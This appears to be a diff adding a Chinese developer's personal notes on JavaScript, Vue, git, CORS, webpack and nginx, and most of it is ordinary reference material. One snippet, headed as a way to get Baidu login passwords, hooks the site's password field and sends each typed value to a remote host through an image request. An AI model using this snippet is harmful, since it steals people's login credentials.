+//细化操作
+a=document.getSelection()//获取选中的内容,是个对象
+a.toString()//"ame:",字符串
+range=a.getRangeAt(0)//取得代表选区的范围,是对象
+p=document.createElement('p')
+p.style.background='red'
+range.surroundContents(p)//把选中的内容包裹在p标签里
+<p style="background: red;">me:</p>
+//linux命令
+echo 1234 >> aa.js//追加内容,会换行
+echo 1234 > aa.js//追加内容,会替换
+cat aa.js//读取文件
+//canvas把画布转化为图片
+<canvas id="drawing" width="200" height="200"></canvas>
+//js
+var drawing=document.getElementById('drawing');
+var ctx =drawing.getContext('2d');
+ctx.fillStyle = 'red';
+ctx.arc(100, 100, 30, 0, Math.PI * 2, true);
+ctx.fill("evenodd");
+var imgURI=drawing.toDataURL('image/png');
+var img=document.createElement('img');
+img.src=imgURI;
+document.body.appendChild(img)
+//保存状态save保存restore回退
+context.fillStyle = "#ff0000";
+context.save();
+context.fillStyle = "#0000ff";
+context.fillRect(0, 0, 100, 200); //从点(100,100)开始绘制蓝色矩形
+context.restore();
+//encodeURIComponent对URL转码
+a='http://www.yourdomain.com/?redir=http://www.someotherdomain.com?a=b&c=d'
+encodeURIComponent(a)
+"http%3A%2F%2Fwww.yourdomain.com%2F%3Fredir%3Dhttp%3A%2F%2Fwww.someotherdomain.com%3Fa%3Db%26c%3Dd"
+//把错误回传到服务器
+function log(sev, msg) {
+    // sev错误严重程度,msg错误信息
+    const img=new Image();
+    img.src='http://172.17.14.250/?sev='+sev+'&msg='+msg;
+}
+try{
+    console.log(a)
+}catch (e) {
+    log(e.message)
+}
+git重置登录信息 git config --system --unset credential.helper
+//设置账号密码
+C:\users\Administrator
+vim .git-credentials
+https://740470290%40qq.com:密码@github.com
+git config --global credential.helper store      
+//版本回退
+git log//历史记录
+git reset --hard ce72613bbd9d1f23adf529a59140223fdf2963e0//回退
+git log --pretty=oneline//历史记录,按行显示
+git reflog//本机所有历史记录
+git branch first//新建分支
+git branch//查看所有分支
+git checkout first//选择分支
+git merge v1//合并分支
+git branch -d v1//删除分支
+ls ~/.ssh//查看本机密钥
+ssh-keygen -t rsa -C '740470290@qq.com'//本机生成密钥
+把公钥复制到github上
+ssh -T git@github.com//检测
+//关联
+git init//初始化
+//建立关联
+git remote add origin https://github.com/740470290/Packages.git
+git remote//查看关联
+git remote remove origin//删除关联
+git pull origin master//拉取文件
+git push origin master//push文件
+//express跨域
+app.use(function (req,res,next) {
+  res.header('Access-Control-Allow-Origin', '*')
+  next()
+})
+//查看vue对象
+app.__vue__
+修改vuex的值
+app.__vue__.$store.commit('userStatus', true)
+app.__vue__.$store.dispatch('setUser', false)
+//vueX的mapActions方法
+...mapActions([
+'increment', // 将 `this.increment()` 映射为 `this.$store.dispatch('increment')`
+// `mapActions` 也支持载荷：
+'incrementBy' // 将 `this.incrementBy(amount)` 映射为 `this.$store.dispatch('incrementBy', amount)`
+])
+//sessionStorage操作
+window.sessionStorage.setItem('one', 'text');
+window.sessionStorage.getItem('one')
+window.sessionStorage.removeItem('one');
+window.sessionStorage.clear();
+//vue配置全局变量
+Vue.prototype.site = 'http://172.17.14.250/api'
+//高性能javasript,f()调用一次后,会被内部的函数覆盖,用于检测浏览器类型,避免函数重复调用
+//延迟加载
+function f(){
+	console.log(111)
+	f=function(){console.log(222)}
+	f()
+}
+//预加载
+var f=document.body.addEventListener?
+	function(){}:function(){}
+//位运算
+if(i & 1)为奇数
+//JSON.stringify高级用法
+//过滤
+var book = {
+ "title": "Professional JavaScript",
+ "authors": [
+ "Nicholas C. Zakas"
+ ],
+ edition: 3,
+ year: 2011
+ };
+var jsonText = JSON.stringify(book, ["title", "edition"]);
+"{"title":"Professional JavaScript","edition":3}"
+//传方法
+var book = {
+'title': 'Professional JavaScript',
+'authors': [
+  'Nicholas C. Zakas'
+],
+edition: 3,
+year: 2011
+}
+var jsonText = JSON.stringify(book, function (key, value) {
+switch (key) {
+  case 'authors':
+    return value.join(',')
+  case 'year':
+    return 5000
+  case 'edition':
+    return undefined
+  default:
+    return value
+}
+})
+"{"title":"Professional JavaScript","authors":"Nicholas C. Zakas","year":5000}"
+//格式化输出结果
+var book = {
+ "title": "Professional JavaScript",
+ "authors": [
+ "Nicholas C. Zakas"
+ ],
+ edition: 3,
+ year: 2011
+    };
+var jsonText = JSON.stringify(book, null, 4);
+//-----------------------------
+{
+    "title": "Professional JavaScript",
+    "authors": [
+        "Nicholas C. Zakas"
+    ],
+    "edition": 3,
+    "year": 2011
+}
+//FormData用法,可以配和ajax的post使用xhr.send(new FormData(document.forms[0]))
+<form action="">
+    <input type="text" name="name" value="admin">
+    <input type="password" name="pwd" value="123">
+    <input type="submit">
+</form>
+<script>
+ var data = new FormData(document.forms[0]);
+ console.log(data)
+</script>
+data.get('name')
+"admin"
+//ajax超时处理
+xhr.timeout = 1000; //将超时设置为 1 秒钟（仅适用于 IE8+）
+xhr.ontimeout = function(){ 
+ alert("Request did not return in a second."); 
+};
+//ajax跨域添加cookie
+对于跨域访问并需要伴随认证信息的请求，需要在 XMLHttpRequest 实例中指定 withCredentials 为 true（具体见下方jQuery ajax部分）。
+这个中间件你可以根据自己的需求进行构建，如果需要在请求中伴随认证信息（包含 cookie，session）那么你就需要指定 Access-Control-Allow-Credentials 为 true, 因为对于预请求来说如果你未指定该响应头，那么浏览器会直接忽略该响应。
+在响应中指定 Access-Control-Allow-Credentials 为 true 时，Access-Control-Allow-Origin 不能指定为 *（这个一定要注意，我就是在这个地方调了好久）
+后置中间件只有在正常响应时才会被追加响应头，而如果出现异常，这时响应是不会经过中间件的。
+完整的无歧义的表述应该是这样：
+1.ajax会自动带上同源的cookie，不会带上不同源的cookie
+2. 可以通过前端设置withCredentials为true， 后端设置Header的方式让ajax自动带上不同源的cookie，但是这个属性对同源请求没有任何影响。会被自动忽略。
+3. 这是MDN对withCredentials的解释： MDN-withCredentials ，我接着解释一下同源。
+众所周知，ajax请求是有同源策略的，虽然可以应用CORS等手段来实现跨域，但是这并不是说这样就是“同源”了。ajax在请求时就会因为这个同源的问题而决定是否带上cookie，这样解释应该没有问题了吧，还不知道同源策略的，应该去谷歌一下看看。
+x.open('GET', f + u, true)
+x.withCredentials = true // 这句话是重点
+x.send()
+//express服务器端
+app.use(function (req,res,next) {
+  res.header('Access-Control-Allow-Origin', 'http://172.17.14.250:8080');
+  // res.header('Access-Control-Allow-Credentials','true');
+  // res.header("Access-Control-Allow-Headers", "Content-Type,username");
+  next()
+});
+//阻止修改对象preventExtensions,不可以拓展,可以修改删除
+var person = {name:'tom'}
+console.log(Object.isExtensible(person))//true
+Object.preventExtensions(person)
+console.log(Object.isExtensible(person))//false
+delete person.name
+console.log(person)//{}
+//seal密封对象,可以修改,不能删除,添加
+var person = {name:'tom'}
+Object.seal(person)
+delete person.name
+console.log(person)//{name: "tom"}
+person.name='lili'
+console.log(person)//{name: "lili"}
+//freeze冻结对象,禁止一切操作
+var person = {name:'tom'}
+Object.freeze(person)
+person.name='lili'
+console.log(person)//{name: "tom"}
+//高级定时器
+var a=setTimeout(function () {
+  console.log(123)
+  setTimeout(arguments.callee,1000)
+},1000)
+//数组分块模式
+setTimeout(function(){
+ //取出下一个条目并处理
+ var item = array.shift(); 
+ process(item); 
+ //若还有条目，再设置另一个定时器
+ if(array.length > 0){ 
+ setTimeout(arguments.callee, 100); 
+ } 
+}, 100);
+//Promise异步
+new Promise((resolve, reject) => {
+    setTimeout(() => {
+      console.log('第一层')
+      resolve()
+    }, 1000)
+  }).then(() => {
+    console.log('第一层结束')
+    return new Promise((resolve, reject) => {
+      setTimeout(() => {
+        console.log('第二层')
+        resolve()
+      }, 1000)
+    })
+  }).then(() => {
+    console.log('第二层结束')
+    return new Promise((resolve, reject) => {
+      setTimeout(() => {
+        console.log('第三层')
+        resolve()
+      }, 1000)
+    })
+  }).then(() => {
+    console.log('第三层结束')
+  })
+//  fn(4).then中传2个方法,第二个是失败的方法,或者用catch代替它
+  let fn = function(num){
+    return new Promise((resolve,reject)=>{
+      if(num>5){
+        resolve('数字大于5');
+      }else{
+        throw new Error('抛出一个错误')
+      }
+    });
+  }
+  fn(4).then(msg=>{
+    console.log('resolve: ',msg);
+  },msg=>{
+    console.log('rejected: ',msg);
+  })
+  //catch方式,效果相同
+  fn(4).then(msg=>{
+    console.log('resolve: ',msg);
+  }).catch(function(err){
+    console.log('error: ',err);
+  })
+  //promise,all全部完成,方法才结束
+  function f (src) {
+    return new Promise((resolve,reject)=>{
+      let img=new Image();
+      img.src=src;
+      img.width=300;
+      img.onload=()=>{
+        resolve(img)
+      }
+      img.onerror=(err)=>{
+        reject(err)
+      }
+    })
+  }
+  Promise.all([f('http://es6.ruanyifeng.com/images/cover-3rd.jpg'),
+    f('https://img13.360buyimg.com/n1/jfs/t1/41185/39/1791/180632/5cc7ea4aE962765e5/cca0bb5707ce99e9.jpg')
+  ]).then(imgs=>{
+    imgs.forEach(img=>{
+       document.body.appendChild(img)
+    })
+  },err=>{
+    console.log(err)
+  })
+  //race,只要有一个完成,就跳出,只输出一个
+  Promise.race([f('http://es6.ruanyifeng.com/images/cover-3rd.jpg'),
+    f('https://img13.360buyimg.com/n1/jfs/t1/41185/39/1791/180632/5cc7ea4aE962765e5/cca0bb5707ce99e9.jpg')
+  ]).then(img=>{
+       document.body.appendChild(img)
+  },err=>{
+    console.log(err)
+  })
+//js代码规范
+变量名应为名词如 car 或 person
+函数名应该以动词开始，如 getName()。返回布尔类型值的函数一般以 is 开头，如isEnable()
+变量和函数都应使用合乎逻辑的名字，不要担心长度。长度问题可以通过后处理和压缩（本章后面会讲到）来缓解
+1.最好别分别定义module.exports和exports
+2.NodeJs开发者建议导出对象用module.exports,导出多个方法和变量用exports
+//代码规范
+1.尊重对象所有权,不修改内置对象Array,Object等
+2.避免全局量
+3.避免与 null 进行比较
+4. 使用常量(重复值,用户界面字符串,URLs,任意可能会更改的值)
+//高性能
+1.避免全局查找
+2. 避免 with 语句,with 语句会创建自己的作用域，
+3.原生方法较快
+4.Switch 语句较快
+5.位运算符较快
+6.多个变量声明用一个var  var count = 5, color = "blue", 
+7.插入迭代值var name = values[i++]
+8.使用数组和对象字面量
+9.使用事件代理(事件委托)
+10.服务器压缩
+11.循环的时候,do..while,switch方法性能高,参数递减性能高,如果3个左右的循环,直接打印就行,别用循环.多次应用dom,用一个常量接住
+//读取文件,如果是图片或者文字就在页面展示,并且显示进度
+<input type="file" id="files-list">
+<div id="output"></div>
+<div id="progress"></div>
+<script>
+var filesList = document.getElementById("files-list");
+filesList.addEventListener("change", function(event){
+ var info = "",
+ output = document.getElementById("output"),
+ progress = document.getElementById("progress"),
+ files = event.target.files,
+ type = "default",
+ reader = new FileReader();
+ if (/image/.test(files[0].type)){
+ reader.readAsDataURL(files[0]);
+ type = "image";
+ } else {
+ reader.readAsText(files[0]);
+ type = "text";
+ }
+ reader.onerror = function(){
+ output.innerHTML = "Could not read file, error code is " +
+ reader.error.code;
+ };
+ reader.onprogress = function(event){
+ if (event.lengthComputable){
+ progress.innerHTML = event.loaded + "/" + event.total;
+ }
+ };
+ reader.onload = function(){
+ var html = "";
+ switch(type){
+ case "image":
+ html = "<img src=\"" + reader.result + "\">";
+ break;
+ case "text":
+ html = reader.result;
+ break;
+ }
+ output.innerHTML = html;
+ };
+});
+</script>
+//中间函数,f把接收的参数,都给a
+ function a (a,b,c) {
+    return a+b+c
+  }
+ function f(d,...arr){
+ var handlerArgs = Array.prototype.slice.call(arguments,1)
+  console.log(a.apply(null,handlerArgs))
+  console.log(a.call(null,...handlerArgs))
+  console.log(a(...arr))
+ }
+ f('add',4,5,6)
+//requestAnimationFrame
+<style>
+    #app{
+      width: 20px;
+      height: 20px;
+      background: red;
+      border-radius: 50%;
+      position: absolute;
+      left: 20px;
+      top: 300px;
+    }
+  </style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var app=document.querySelector('#app')
+var globalID;
+let i=20;
+function animate() {
+  i+=3
+  app.style.left=i+'px'
+  app.style.width=i+'px'
+  app.style.height=i+'px'
+  globalID=requestAnimationFrame(animate);
+  // Do something animate
+}
+//when ot start
+	globalID=requestAnimationFrame(animate);
+// 	cancelAnimationFrame(globalID);
+  setTimeout(function () {
+    cancelAnimationFrame(globalID)
+  },2000)
+</script>
+//class继承
+ class Person{
+    constructor (age){
+      this.age=age
+    }
+    eat(){
+      return 'good'
+    }
+  }
+class Polygon extends Person{
+  constructor(name) {
+    //调用super的age
+    super(48)
+    this.name = name;
+  }
+  eat(){
+      //调用super的方法
+      return super.eat()
+    }
+  say(){
+    return this.name
+  }
+}
+var poly1 = new Polygon("Polygon");
+console.log(poly1.eat());//'good'
+//setPrototypeOf实现继承
+var obj1 = {
+  method1() {
+    console.log("method 1");
+  }
+}
+var obj2 = {
+  method2() {
+   super.method1();
+  }
+}
+console.log(Object.setPrototypeOf(obj2, obj1));//{method2: ƒ}
+obj2.method2();//method 1
+//查找兄弟单词,输出个数,以及对应位置的单词
+function brother(...arr) {
+console.log(arr);
+const word=arr[arr[0]+1];
+console.log(word);
+let count=[];
+for(let i=1;i<=arr[0];i++){
+    if(arr[i]!==word&&arr[i].split('').sort().join('')===word){
+	count.push(i)
+    }
+}
+console.log(count.length,arr[count[arr[arr.length-1]]])
+}
+brother(3,'abc','cba','acb','abc',1)
+//最小公倍数
+function minNumber(a,b) {
+    let min=a;
+    while(min%b!==0){
+        min+=a;
+    }
+    console.log(min)
+}
+minNumber(8,16)
+//五张牌，每张牌由牌大小和花色组成，牌大小2~10、J、Q、K、A，牌花色为红桃、黑桃、梅花、方块四种花色之一。 
+判断牌型:
+牌型1，同花顺：同一花色的顺子，如红桃2红桃3红桃4红桃5红桃6。
+牌型2，四条：四张相同数字 + 单张，如红桃A黑桃A梅花A方块A + 黑桃K。
+牌型3，葫芦：三张相同数字 + 一对，如红桃5黑桃5梅花5 + 方块9梅花9。
+牌型4，同花：同一花色，如方块3方块7方块10方块J方块Q。
+牌型5，顺子：花色不一样的顺子，如红桃2黑桃3红桃4红桃5方块6。
+牌型6，三条：三张相同 + 两张单。
+说明：
+1）五张牌里不会出现牌大小和花色完全相同的牌。
+2）前面的牌型比后面的牌型大，如同花顺比四条大，依次类推。
+输入描述:
+输入由5行组成
+每行为一张牌大小和花色，牌大小为2~10、J、Q、K、A，花色分别用字符H、S、C、D表示红桃、黑桃、梅花、方块。
+输出描述:
+输出牌型序号，5张牌符合多种牌型时，取最大的牌型序号输出
+function max(a,b,c,d,e) {
+    let arr=[a[0],b[0],c[0],d[0],e[0]];//牌的大小
+    for(let i=0;i<5;i++){
+        if(arr[i]==='J'){
+            arr[i]='11'
+        }else if(arr[i]==='Q'){
+            arr[i]='12'
+        }else if(arr[i]==='K'){
+            arr[i]='13'
+        }else if(arr[i]==='A'){
+            arr[i]='14'
+        }
+    }
+    arr.sort((a,b)=>a-b);
+    let arr1=[a[1],b[1],c[1],d[1],e[1]];//牌的花色
+    if((new Set(arr1)).size===1&&(new Set(arr)).size===5&&arr[4]-arr[0]===4){
+        return 1
+    }
+    if((new Set(arr)).size===2){
+        if(arr[1]===arr[3]){
+            return 2
+        }else {
+            return 3
+        }
+    }
+    if((new Set(arr1)).size===1){return 4}
+    if((new Set(arr)).size===5&&arr[4]-arr[0]===4){return 5}
+    if((new Set(arr)).size===3){
+        if(arr[0]===arr[2]||arr[1]===arr[3]||arr[2]===arr[4]){return 6}
+    }
+    return 7;
+}
+console.log(max('4c','2c','4c','5c','8h'))
+//根据对象的某个字段排序(根据id排序)
+msg:[
+{id:2, name:'tom'},
+{id:3, name:'asd'},
+{id:1, name:'fghj'},
+]
+this.msg.sort((a,b)=>a.id-b.id)
+1.我们需要牢记两点：①__proto__和constructor属性是对象所独有的；② prototype属性是函数所独有的，因为函数也是一种对象，所以函数也拥有__proto__和constructor属性。
+2.__proto__属性的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（父对象）里找，一直找，直到__proto__属性的终点null，然后返回undefined，通过__proto__属性将对象连接起来的这条链路即我们所谓的原型链。
+3.prototype属性的作用就是让该函数所实例化的对象们都可以找到公用的属性和方法，即f1.__proto__ === Foo.prototype。
+4.constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function。
+//vue的native用法
+<router-view :arr="arr" @func="show" @click.native="show" />
+show () {
+  alert(123)
+}
+Vue.directive('focus', {
+  inserted: function (el) {
+    el.focus()
+  }
+})
+//冒泡排序
+function bubbleRank(arr){
+  for(let i=0;i<arr.length-1;i++){
+    for(let j=0;j<arr.length-1-i;j++){
+      arr[j]>arr[j+1]
+      && ([arr[j],arr[j+1]]=[arr[j+1],arr[j]])
+    }
+  }
+  return arr
+}
+//webpack打包文件,去除map文件
+config/index.js
+productionSourceMap: false,
+//webpack打包文件,压缩大图片,先安装插件,然后写入配置文件
+cnpm install image-webpack-loader --save-dev
+{
+test: /\.(png|jpe?g|gif|svg)(\?.*)?$/,
+loader: 'image-webpack-loader',
+options: {
+  bypassOnDebug: true,
+}
+},
+// vue打包后,在服务器上,刷新页面404问题
+由于刷新页面,导致重新向服务器发送请求,服务器无法匹配,出现404页面
+由于前端npm打包时,已经对路由进行配置,所以开发环境没有这个问题
+解决方法,1.将nginx中的location配置修改为如下代码
+2.使用vue-router官网的代码
+https://segmentfault.com/a/1190000016653688?utm_source=tag-newest
+location /{
+    root   html;
+    index  index.html index.htm;
+    if (!-e $request_filename) {
+        rewrite ^/(.*) /index.html last;
+        break;
+    }
+}
+// 元素的外边距无法消除
+设置font-size: 0;
+// 获取百度登录密码
+document.getElementById('TANGRAM__PSP_10__password').oninput=function () {
+    var img=new Image()
+    img.src='http://192.168.2.116:4000/?pwd='+this.value;
+}
+//css相对居中
+margin:0 auto;
+position:relative;
+left:50px;
+//图片hover,加一个覆盖的颜色
+.inter_learn .pic:after{
+    position: absolute;
+    content: '';
+    width: 392px;
+    height: 392px;
+    right: 0;
+    background: #25b7eb;
+    opacity: 0;
+}
+.inter_learn .pic:hover:after{
+    opacity: .8;
+}
+vue watch立即生效
+immediate: true
+vue router.beforeEach立即生效
+router.beforeEach放在new Vue前面
+//ajax发送多文件,ajax发送表单
+<form ref="form" onsubmit="return false">
+<input type="file" accept="image/*" name="worksPictures" multiple="multiple" class="custom-file-input" id="customFile">
+<input class="btn btn-success" type="submit" value="上传" @click="submit">
+</form>
+=======================
+const form=new FormData(this.$refs.form);
+axios.post('/excellentWorks/add',form)
+或者放在原生ajax的send(form)里
+// vue路由懒加载
+// import Login from '@/components/Login'
+改写为
+const Login = () => import('@/components/Login')
+nuxt
+1.渲染页面前调用asyncData向组件内部注入数据
+2.渲染页面前调用fetch向store中注入数据
+nuxtServerInit
+将服务端的一些数据传到客户端
+// 服务器端渲染,运用nuxt框架编写(不使用该框架也可以用vue的方法,但是会很麻烦),编译生成2个文件夹,一个server一个client
+client是客户端的代码,运行的时候需要开启node服务器,把client的代码渲染好,返回给用户,可以加一个Nginx服务器做负载均衡
+// 预渲染,本质是webpack打包时,可以自己配置几个需要预渲染的路由,把这几个的html页面多打包一份,生成html文件,css和js代码还是用的公用的,
+无论访问那个路由,都会把单页面完整的代码都返回给浏览器.关键是prerender-spa-plugin,这个webpack插件,在build文件夹下webpack.prod.conf.js
+中写入配置文件,具体见https://github.com/740470290/vue_message
+
+
+
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
